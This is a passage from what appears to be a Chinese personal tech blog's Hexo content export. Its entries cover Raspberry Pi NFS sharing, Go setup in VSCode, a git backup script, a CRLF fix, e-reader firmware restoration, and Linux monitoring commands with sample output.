<p><strong>可以看出rpcbind.socket一直在监听端口</strong></p>
<p><strong>安装nfs</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install nfs-kernel-server</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230508145655757.png" alt="image-20230508145655757"></p>
<p><strong>查看rpcbind.socket状态</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl status rpcbind.service</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230508145512096.png" alt="image-20230508145512096"></p>
<p><strong>从上面安装好看nfs再查看rpcbind.service可以发现，nfs没开启服务，rpcbind.service也不会自动开启</strong></p>
<p><strong>这次，我们开启nfs再查看nfs和rpcbind.service的服务状态</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl restart nfs-kernel-server.service</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl status nfs-kernel-server.service</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230508145901666.png" alt="image-20230508145901666"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl status rpcbind.service</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230508145927673.png" alt="image-20230508145927673"></p>
<p><strong>可以看出，nfs服务启动后，rpcbind.socket检测到端口被激活从而开启了rpcbind.service服务</strong></p>
<p><strong>编辑&#x2F;etc&#x2F;exports</strong></p>
<p><strong>后面的权限我先不加，这里默认是只读</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/data *</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230508152044419.png" alt="image-20230508152044419"></p>
<p><strong>重新加载配置(不需要重启服务)</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">exportfs -r</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230508152209456.png" alt="image-20230508152209456"></p>
<p><strong>查看默认权限</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">exportfs -v</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230508152254228.png" alt="image-20230508152254228"></p>
<p><strong>显示NFS服务器的共享信息</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">showmount -e</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230508152331011.png" alt="image-20230508152331011"></p>
<p><strong>win10挂载nfs共享目录</strong></p>
<p><strong>先打开控制面板，找到程序</strong></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230508152719331.png" alt="image-20230508152719331"></p>
<p><strong>点击启用或者关闭windows功能</strong></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230508152753361.png" alt="image-20230508152753361"></p>
<p><strong>把nfs服务全选上</strong></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230508152913031.png" alt="image-20230508152913031"></p>
<p><strong>然后确认退出，打开此电脑找到映射网络驱动器</strong></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230508152644711.png" alt="image-20230508152644711"></p>
<p><strong>按照<code>\\ip\共享目录名字</code>这样的格式</strong></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230508153030562.png" alt="image-20230508153030562"></p>
<p><strong>然后就能看到共享的文件了</strong></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230508153203212.png" alt="image-20230508153203212"></p>
<p><strong>由于上面在&#x2F;etc&#x2F;exports里没有添加权限使用仅有下载功能，硬盘的大小还不能完全支配</strong></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230508153328881.png" alt="image-20230508153328881"></p>
<p><strong>卸载挂载。。。懂？</strong></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230508154432995.png" alt="image-20230508154432995"></p>
<p><strong>linux挂载nfs共享目录</strong></p>
<p><strong>很简单。。。知道怎么挂载磁盘吧。。。就是这样</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mount ip:/data /服务器的本地文件夹</span><br></pre></td></tr></table></figure>

<p><strong>临时挂载很不方便，你懂的！！！重启就没了，可以试一下永久挂载，这里就不BB了</strong></p>
<p><strong>卸载挂载</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">umount /服务器的本地文件夹</span><br></pre></td></tr></table></figure>

<p><strong>权限修改</strong></p>
<p><strong>rw</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/data *(rw)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">exportfs -r</span><br><span class="line">exportfs -v</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230508160434284.png" alt="image-20230508160434284"></p>
<p><strong>拉个文件进去，它说哒咩！！！</strong></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230508155738554.png" alt="image-20230508155738554"></p>
<p><strong>这怎么回事捏，我可是win10的主人，居然没有权限访问？</strong></p>
<p><strong>好吧！虽然是win10的主人，但是linux层面上你只是一个来宾，所以还要在文件夹授予其他用户权限</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> o+rw /data/</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230508160220572.png" alt="image-20230508160220572"></p>
<p><strong>嘿嘿！给了权限就可以上传了</strong></p>
<p><img src="/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/image-20230508160209860.png" alt="image-20230508160209860"></p>
<table>
<thead>
<tr>
<th>权限选择</th>
<th>权限的作用</th>
</tr>
</thead>
<tbody><tr>
<td>ro</td>
<td>只读</td>
</tr>
<tr>
<td>rw</td>
<td>读写</td>
</tr>
<tr>
<td>async</td>
<td>异步，先将数据写入到内存，在将数据写入到硬盘（性能高）</td>
</tr>
<tr>
<td>root_squash</td>
<td>将客户端使用的是root用户时，则映射到NFS服务器的用户为NFS的匿名用户（nfsnobody）</td>
</tr>
<tr>
<td>no_root_squash</td>
<td>将客户端使用的是root用户时，则映射到FNS服务器的用户依然为root用户</td>
</tr>
<tr>
<td>all_squash</td>
<td>默认选项，将所有访问NFS服务器的客户端的用户都映射为匿名用户，不管客户端使用的是什么用户</td>
</tr>
<tr>
<td>anonuid</td>
<td>设置映射到本地的匿名用户的UID（配合all_squash使用）</td>
</tr>
<tr>
<td>anongid</td>
<td>设置映射到本地的匿名用户的GID（配合all_squash使用）</td>
</tr>
<tr>
<td>sync</td>
<td>默认选项，保持数据同步，数据同步写入到内存和硬盘</td>
</tr>
<tr>
<td>secure</td>
<td>NFS客户端必须使用NFS保留端口（通常是1024以下的端口），默认选项</td>
</tr>
<tr>
<td>insecure</td>
<td>允许NFS客户端不使用NFS保留端口（通常是1024以上的端口）</td>
</tr>
</tbody></table>
<h4 id="openmediavault"><a href="#openmediavault" class="headerlink" title="openmediavault"></a>openmediavault</h4><p><a href="https://www.openmediavault.org/">https://www.openmediavault.org/</a></p>
<p><a href="https://mirrors.tuna.tsinghua.edu.cn/help/openmediavault/">OpenMediaVault | 镜像站使用帮助 | 清华大学开源软件镜像站 | Tsinghua Open Source Mirror</a></p>
<h3 id="raspberry-python-控-GPIO"><a href="#raspberry-python-控-GPIO" class="headerlink" title="raspberry python 控 GPIO"></a>raspberry python 控 GPIO</h3><p><strong>python添加gpiozero库</strong></p>
<h3 id="raspberry-python-与树莓派硬件交互"><a href="#raspberry-python-与树莓派硬件交互" class="headerlink" title="raspberry python 与树莓派硬件交互"></a>raspberry python 与树莓派硬件交互</h3><p><strong>python添加psutil库、OS库、commands库、subprocess库</strong></p>
]]></content>
      <categories>
        <category>娱乐单片机</category>
      </categories>
      <tags>
        <tag>树莓派</tag>
        <tag>单片机</tag>
      </tags>
  </entry>
  <entry>
    <title>VSCODE编程</title>
    <url>/2022/11/28/VSCODE%E7%BC%96%E7%A8%8B/</url>
    <content><![CDATA[<h1 id="VSCODE编程"><a href="#VSCODE编程" class="headerlink" title="VSCODE编程"></a>VSCODE编程</h1><h2 id="GO环境搭建"><a href="#GO环境搭建" class="headerlink" title="GO环境搭建"></a>GO环境搭建</h2><h3 id="安装GO"><a href="#安装GO" class="headerlink" title="安装GO"></a>安装GO</h3><p><a href="https://golang.google.cn/dl/">golang安装包下载</a></p>
<p>无脑安装完成之后，需要配置GO的环境。</p>
<p>先去下面的网站找到GO的代理模块，然后更改计算机的环境变量。</p>
<p><a href="https://goproxy.io/zh/">GOPROXY.IO - 一个全球代理 为 Go 模块而生</a></p>
<p>此电脑-&gt;属性-&gt;高级系统设置-&gt;环境变量-&gt;系统变量-&gt;新建</p>
<p>然后按照代理官网改成这样即可</p>
<p><img src="/2022/11/28/VSCODE%E7%BC%96%E7%A8%8B/image-20221128181434274.png" alt="image-20221128181434274"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 配置 GOPROXY 环境变量</span></span><br><span class="line"><span class="variable">$env</span>:GOPROXY = <span class="string">&quot;https://proxy.golang.com.cn,direct&quot;</span></span><br><span class="line"><span class="comment"># 还可以设置不走 proxy 的私有仓库或组，多个用逗号相隔（可选）</span></span><br><span class="line"><span class="variable">$env</span>:GOPRIVATE = <span class="string">&quot;git.mycompany.com,github.com/my/private&quot;</span></span><br></pre></td></tr></table></figure>

<p>很简单的</p>
<p><img src="/2022/11/28/VSCODE%E7%BC%96%E7%A8%8B/Snipaste_2022-12-08_19-47-15.png" alt="Snipaste_2022-12-08_19-47-15"></p>
<p><img src="/2022/11/28/VSCODE%E7%BC%96%E7%A8%8B/Snipaste_2022-12-08_19-47-54.png" alt="Snipaste_2022-12-08_19-47-54"></p>
<p><img src="/2022/11/28/VSCODE%E7%BC%96%E7%A8%8B/Snipaste_2022-12-08_19-48-32.png" alt="Snipaste_2022-12-08_19-48-32"></p>
<p><img src="/2022/11/28/VSCODE%E7%BC%96%E7%A8%8B/image-20221128181347802.png" alt="image-20221128181347802"></p>
<p>然后打开vscode</p>
<p><img src="/2022/11/28/VSCODE%E7%BC%96%E7%A8%8B/image-20221128182822511.png" alt="image-20221128182822511"></p>
<p>然后打开一个文件夹，这里我打开一个叫GO的文件夹</p>
<p><img src="/2022/11/28/VSCODE%E7%BC%96%E7%A8%8B/image-20221128182935927.png" alt="image-20221128182935927"></p>
<p>在左侧鼠标右击选择在集成终端中打开</p>
<p><img src="/2022/11/28/VSCODE%E7%BC%96%E7%A8%8B/image-20221128183011568.png" alt="image-20221128183011568"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">go mod init github.com/your_github_name/GO</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/28/VSCODE%E7%BC%96%E7%A8%8B/image-20221128183233831.png" alt="image-20221128183233831"></p>
<p>然后创建一个文件，写你的helloword去</p>
<p><img src="/2022/11/28/VSCODE%E7%BC%96%E7%A8%8B/image-20221128183333155.png" alt="image-20221128183333155"></p>
<p>注意！写完文件的后缀之后，它会识别你的是go语言，然后右下角又弹出的安装go的插件，记得全部都安装。</p>
<p><img src="/2022/11/28/VSCODE%E7%BC%96%E7%A8%8B/image-20221128183520112.png" alt="image-20221128183520112"></p>
<p>这个运行和调试就是运行代码。。。你懂的！！！</p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>环境工具</tag>
      </tags>
  </entry>
  <entry>
    <title>ZStack(搁浅)</title>
    <url>/2023/05/16/ZStack/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，这个密码看着不太对，请重新试一下。" data-whm="抱歉，这个文章不能被纠正，不过您还是能看看解密后的内容。">
  <script id="hbeData" type="hbeData" data-hmacdigest="13e22af4d0a3e0d77c1468f1bd1d105184341f56648227df52094c0e34a5d08f">63612e356b8da2492e34c835963418410512da5924977d303e4f05ad1de34089</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好，这里需要密码。</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>Linux系统</category>
      </categories>
      <tags>
        <tag>运维</tag>
      </tags>
  </entry>
  <entry>
    <title>armx64_ISO镜像站地址</title>
    <url>/2022/12/18/armx64_ISO%E9%95%9C%E5%83%8F%E7%AB%99%E5%9C%B0%E5%9D%80%E5%A4%A7%E5%85%A8/</url>
    <content><![CDATA[<p>[toc]</p>
<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><strong>本人经常折腾x86架构的系统和arm架构的系统，在大一的时候是老师直接分发下载地址或者直接把镜像交予我们，但是很多选择镜像的信息和如何选择对应架构的镜像都没有很好的给我们普及，再加上自己没有很好利用搜索引擎的作用，到大三还是没能接触到各种架构的全部信息。所以本篇致力于讲述各架构之间的不同和如何使用不同架构的镜像。</strong></p>
<h2 id="架构描述篇"><a href="#架构描述篇" class="headerlink" title="架构描述篇"></a>架构描述篇</h2><p><strong>aarch64 就是arm架构的64位系统，基于armv8指令集的64位架构，应该是后续ARM主流商用服务器的标准。</strong></p>
<p><strong>x86_64 我们常说的主流的64位架构，代表厂家有Intel、AMD。</strong></p>
<p><strong>i386 就是已经即将被淘汰的x86的以奔腾系列位代表的32位架构。</strong></p>
<p><strong>后面3种都是IMb的power系列：</strong></p>
<p><strong>power9 对应IBM的power9架构cpu</strong></p>
<p><strong>ppc64  IBM power系列架构，目标架构为64位PowerPC和Power Architecture处理器，并对此优化的应用程序的标识符，编译源代码时经常使用</strong></p>
<p><strong>ppc64el 纯小端模式，power8作为首要目标，OpenPower基金会基础的技术，试图使基于x86的Linux软件的移植工作以最小的工作量进行</strong></p>
<h1 id="armx64-ISO镜像站地址大全"><a href="#armx64-ISO镜像站地址大全" class="headerlink" title="armx64_ISO镜像站地址大全"></a>armx64_ISO镜像站地址大全</h1><h2 id="Centos7"><a href="#Centos7" class="headerlink" title="Centos7"></a>Centos7</h2><p><a href="http://isoredirect.centos.org/altarch/7/isos/aarch64/">aarch64</a></p>
<h2 id="kali"><a href="#kali" class="headerlink" title="kali"></a>kali</h2><p><a href="https://www.kali.org/get-kali/#kali-installer-images">Kali Linux</a></p>
<h2 id="ubuntu"><a href="#ubuntu" class="headerlink" title="ubuntu"></a>ubuntu</h2>]]></content>
  </entry>
  <entry>
    <title>hexo博客备份方案</title>
    <url>/2023/07/03/hexo%E5%8D%9A%E5%AE%A2%E5%A4%87%E4%BB%BD%E6%96%B9%E6%A1%88/</url>
    <content><![CDATA[<p>[toc]</p>
<h2 id="创建Github-私人仓库"><a href="#创建Github-私人仓库" class="headerlink" title="创建Github 私人仓库"></a>创建Github 私人仓库</h2><p><img src="/2023/07/03/hexo%E5%8D%9A%E5%AE%A2%E5%A4%87%E4%BB%BD%E6%96%B9%E6%A1%88/image-20230706205503819.png" alt="image-20230706205503819"></p>
<h2 id="Git同步"><a href="#Git同步" class="headerlink" title="Git同步"></a>Git同步</h2><p><strong>在博客文件夹内打开，<code>git bash here</code></strong></p>
<p><img src="/2023/07/03/hexo%E5%8D%9A%E5%AE%A2%E5%A4%87%E4%BB%BD%E6%96%B9%E6%A1%88/image-20230706205916999.png" alt="image-20230706205916999"></p>
<p><strong>执行<code>git初始化</code>和<code>本地仓库与远端仓库建立链接</code></strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git init</span><br><span class="line">git remote add origin git@github.com:julintongxue/hexo_back.git</span><br></pre></td></tr></table></figure>

<p><strong>在博客文件夹内创建一个<code>push.sh</code>文件</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\033[32m正在为你备份博客中.........\033[0m&quot;</span></span><br><span class="line">git add .</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\033[32m正在为你备份博客中.........\033[0m&quot;</span></span><br><span class="line">git commit -m <span class="string">&quot;update&quot;</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\033[32m正在为你备份博客中.........\033[0m&quot;</span></span><br><span class="line">git push origin master --force</span><br><span class="line"><span class="keyword">if</span> [ $? -ne 0 ]; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;\033[31m 备份失败！请检查网络情况！ \033[0m&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;\033[32m恭喜你！已为你备份到你的GitHub仓库 backup \033[0m&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<h2 id="运行push-sh文件"><a href="#运行push-sh文件" class="headerlink" title="运行push.sh文件"></a>运行push.sh文件</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./push.sh</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/03/hexo%E5%8D%9A%E5%AE%A2%E5%A4%87%E4%BB%BD%E6%96%B9%E6%A1%88/image-20230706211234168.png" alt="image-20230706211234168"></p>
<p><img src="/2023/07/03/hexo%E5%8D%9A%E5%AE%A2%E5%A4%87%E4%BB%BD%E6%96%B9%E6%A1%88/image-20230706212326847.png" alt="image-20230706212326847"></p>
]]></content>
      <categories>
        <category>博客</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>博客</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo博客探坑之旅</title>
    <url>/2023/07/06/hexo%E5%8D%9A%E5%AE%A2%E6%8E%A2%E5%9D%91%E4%B9%8B%E6%97%85/</url>
    <content><![CDATA[<p>[toc]</p>
<h3 id="Hexo-博客中出现关于-LF-will-be-replaced-by-CRLF-问题出现的原因以及解决方式"><a href="#Hexo-博客中出现关于-LF-will-be-replaced-by-CRLF-问题出现的原因以及解决方式" class="headerlink" title="Hexo 博客中出现关于 LF will be replaced by CRLF 问题出现的原因以及解决方式"></a>Hexo 博客中出现关于 LF will be replaced by CRLF 问题出现的原因以及解决方式</h3><h4 id="出现的原因："><a href="#出现的原因：" class="headerlink" title="出现的原因："></a>出现的原因：</h4><ul>
<li><strong>windows中的换行符为 CRLF，而在Linux下的换行符为LF，所以在执行<code>git add .</code> 时出现警告提示，而且这个警告会阻止hexo博客的推送，导致出现博客一系列问题</strong></li>
<li><strong>CRLF和LF是两种不同的换行格式，git工作区默认为CRLF来作为换行符，</strong><br><strong>所以当我们项目文件里有用的地方使用LF作为换行符，这个时候我们再继续<code>hexo d/(git add .)</code>执行推送或者<code>git commit</code>的时候就会弹出警告，当最终push到远程仓库的时候git会统一格式全部转化为用CRLF作为换行符</strong> </li>
<li><strong>你是Windows程序员，且正在开发仅运行在Windows上的项目，可以设置false取消此功能，把回车符记录在库中：</strong></li>
</ul>
<p><img src="/2023/07/06/hexo%E5%8D%9A%E5%AE%A2%E6%8E%A2%E5%9D%91%E4%B9%8B%E6%97%85/image-20230706181305450.png" alt="image-20230706181305450"></p>
<h4 id="解决方式："><a href="#解决方式：" class="headerlink" title="解决方式："></a>解决方式：</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global core.autocrlf <span class="literal">false</span>  </span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/06/hexo%E5%8D%9A%E5%AE%A2%E6%8E%A2%E5%9D%91%E4%B9%8B%E6%97%85/image-20230706181332379.png" alt="image-20230706181332379"></p>
]]></content>
      <categories>
        <category>博客</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>博客</tag>
      </tags>
  </entry>
  <entry>
    <title>jdread1刷机恢复出厂设置</title>
    <url>/2023/06/04/jdread1%E5%88%B7%E6%9C%BA%E6%81%A2%E5%A4%8D%E5%87%BA%E5%8E%82%E8%AE%BE%E7%BD%AE/</url>
    <content><![CDATA[<p><strong>1、阅读器打开系统更新界面，USB链接电脑选择传输模式</strong><br><strong>2、下载京东阅读器升级包，改名为update.upx，放入磁盘根目录</strong><br><strong>3、弹出USB，回到京东阅读找到系统更新，阅读器会提醒发现升级文件，选择升级即可</strong><br><strong>更新完成就恢复了原版京东阅读系统，开机就是京东阅读</strong><br><strong>系统版本：202012160210</strong><br><strong>升级包官方：<a href="https://firmwares-1252894995.cos.ap-beijing.myqcloud.com/05a94f54b9907b4f68ec7e1d4e2f3a7e.upx">下载链接</a></strong></p>
]]></content>
      <categories>
        <category>安卓系统</category>
      </categories>
      <tags>
        <tag>jdread1</tag>
        <tag>京东阅读器</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo博客插件</title>
    <url>/2023/07/11/hexo%E5%8D%9A%E5%AE%A2%E6%8F%92%E4%BB%B6/</url>
    <content><![CDATA[<p>hexo-asset-image-master</p>
]]></content>
  </entry>
  <entry>
    <title>linux小知识</title>
    <url>/2022/09/04/linux%E5%B0%8F%E7%9F%A5%E8%AF%86/</url>
    <content><![CDATA[<p>[toc]</p>
<h1 id="free"><a href="#free" class="headerlink" title="free"></a>free</h1><p>检测系统内存<code>Mem</code>和交换空间<code>swap</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@raspbian:~<span class="comment"># free -h</span></span><br><span class="line">              total        used        free      shared  buff/cache   available</span><br><span class="line">Mem:          7.7Gi       405Mi       6.8Gi        17Mi       481Mi       7.1Gi</span><br><span class="line">Swap:         1.0Gi          0B       1.0Gi</span><br></pre></td></tr></table></figure>

<p>total:内存总大小</p>
<p>used:已用</p>
<p>free:空闲</p>
<p>available:可用</p>
<p>swap:交换</p>
<h1 id="hdparm"><a href="#hdparm" class="headerlink" title="hdparm"></a>hdparm</h1><p>检查磁盘性能，指定-t选项检查磁盘（评估硬盘的读取效率(不经过磁盘cache)），指定-T 平估硬盘快取的读取效率</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@raspbian:~<span class="comment"># hdparm -t /dev/mmcblk0</span></span><br><span class="line"></span><br><span class="line">/dev/mmcblk0:</span><br><span class="line"> HDIO_DRIVE_CMD(identify) failed: Invalid argument</span><br><span class="line"> Timing buffered disk reads: 132 MB <span class="keyword">in</span>  3.02 seconds =  43.65 MB/sec</span><br><span class="line"></span><br><span class="line">root@raspbian:~<span class="comment"># hdparm -tT /dev/mmcblk0</span></span><br><span class="line"></span><br><span class="line">/dev/mmcblk0:</span><br><span class="line"> Timing cached reads:   1914 MB <span class="keyword">in</span>  2.00 seconds = 958.37 MB/sec</span><br><span class="line"> HDIO_DRIVE_CMD(identify) failed: Invalid argument</span><br><span class="line"> Timing buffered disk reads: 132 MB <span class="keyword">in</span>  3.03 seconds =  43.63 MB/sec</span><br></pre></td></tr></table></figure>

<h1 id="查找命令在哪个软件包"><a href="#查找命令在哪个软件包" class="headerlink" title="查找命令在哪个软件包"></a>查找命令在哪个软件包</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 比如说我需要iostat</span></span><br><span class="line">root@raspbian:~<span class="comment"># apt-cache search iostat</span></span><br><span class="line">dstat - versatile resource statistics tool</span><br><span class="line">ganglia-modules-linux - Ganglia extra modules <span class="keyword">for</span> Linux (IO, filesystems, multicpu)</span><br><span class="line">ifstat - InterFace STATistics Monitoring</span><br><span class="line">nicstat - <span class="built_in">print</span> network traffic statistics</span><br><span class="line">pcp-import-iostat2pcp - Tool <span class="keyword">for</span> importing data from iostat into PCP archive logs</span><br><span class="line">r-cran-epi - GNU R epidemiological analysis</span><br><span class="line">r-cran-epibasix - GNU R Elementary Epidemiological Functions</span><br><span class="line">r-cran-kmi - GNU R Kaplan-Meier Multiple Imputation</span><br><span class="line">r-cran-rms - GNU R regression modeling strategies by Frank Harrell</span><br><span class="line">sysstat - system performance tools <span class="keyword">for</span> Linux</span><br><span class="line"></span><br><span class="line"><span class="comment"># 挑一个吧</span></span><br><span class="line">root@raspbian:~<span class="comment"># apt-get install sysstat</span></span><br></pre></td></tr></table></figure>

<h1 id="iostat"><a href="#iostat" class="headerlink" title="iostat"></a>iostat</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@raspbian:~<span class="comment"># iostat</span></span><br><span class="line">Linux 5.10.78-Release-OPENFANS+20211111-v8 (raspbian)   09/04/2022      _aarch64_       (4 CPU)</span><br><span class="line"><span class="comment">#cpu使用情况</span></span><br><span class="line">avg-cpu:  %user   %<span class="built_in">nice</span> %system %iowait  %steal   %idle</span><br><span class="line">           0.75    0.00    0.45    0.09    0.00   98.71</span><br><span class="line"><span class="comment">#磁盘使用情况</span></span><br><span class="line">Device             tps    kB_read/s    kB_wrtn/s    kB_read    kB_wrtn</span><br><span class="line">mmcblk0           2.71       136.86        24.05    1074327     188817</span><br></pre></td></tr></table></figure>

<p>-c:显示cpu使用情况</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 2秒5次列出cpu情况</span></span><br><span class="line">root@raspbian:~<span class="comment"># iostat -c 2 5</span></span><br><span class="line">Linux 5.10.78-Release-OPENFANS+20211111-v8 (raspbian)   09/04/2022      _aarch64_       (4 CPU)</span><br><span class="line"></span><br><span class="line">avg-cpu:  %user   %<span class="built_in">nice</span> %system %iowait  %steal   %idle</span><br><span class="line">           0.75    0.00    0.44    0.08    0.00   98.73</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">avg-cpu:  %user   %<span class="built_in">nice</span> %system %iowait  %steal   %idle</span><br><span class="line">           0.37    0.00    0.25    0.00    0.00   99.38</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">avg-cpu:  %user   %<span class="built_in">nice</span> %system %iowait  %steal   %idle</span><br><span class="line">           0.13    0.00    0.13    0.00    0.00   99.75</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">avg-cpu:  %user   %<span class="built_in">nice</span> %system %iowait  %steal   %idle</span><br><span class="line">           0.25    0.00    0.12    0.00    0.00   99.62</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">avg-cpu:  %user   %<span class="built_in">nice</span> %system %iowait  %steal   %idle</span><br><span class="line">           0.12    0.00    0.38    0.00    0.00   99.50</span><br></pre></td></tr></table></figure>

<p>-d:磁盘使用情况</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 2秒3次</span></span><br><span class="line">root@raspbian:~<span class="comment"># iostat -d 2 3</span></span><br><span class="line">Linux 5.10.78-Release-OPENFANS+20211111-v8 (raspbian)   09/04/2022      _aarch64_       (4 CPU)</span><br><span class="line"></span><br><span class="line">Device             tps    kB_read/s    kB_wrtn/s    kB_read    kB_wrtn</span><br><span class="line">mmcblk0           2.53       124.41        22.50    1074327     194285</span><br><span class="line"></span><br><span class="line">Device             tps    kB_read/s    kB_wrtn/s    kB_read    kB_wrtn</span><br><span class="line">mmcblk0           3.00         0.00        16.00          0         32</span><br><span class="line"></span><br><span class="line">Device             tps    kB_read/s    kB_wrtn/s    kB_read    kB_wrtn</span><br><span class="line">mmcblk0           1.00         0.00        36.00          0         72</span><br></pre></td></tr></table></figure>

<p>-x:指定磁盘设备名称</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 指定/dev/mmcblk0磁盘设备2秒3次</span></span><br><span class="line">root@raspbian:~<span class="comment"># iostat -dx /dev/mmcblk0 2 3</span></span><br><span class="line">Linux 5.10.78-Release-OPENFANS+20211111-v8 (raspbian)   09/04/2022      _aarch64_       (4 CPU)</span><br><span class="line"></span><br><span class="line">Device            r/s     w/s     rkB/s     wkB/s   rrqm/s   wrqm/s  %rrqm  %wrqm r_await w_await aqu-sz rareq-sz wareq-sz  svctm  %util</span><br><span class="line">mmcblk0          1.45    1.00    118.12     21.71     0.77     1.31  34.61  56.73    5.45   10.22   0.02    81.67    21.76   2.42   0.59</span><br><span class="line"></span><br><span class="line">Device            r/s     w/s     rkB/s     wkB/s   rrqm/s   wrqm/s  %rrqm  %wrqm r_await w_await aqu-sz rareq-sz wareq-sz  svctm  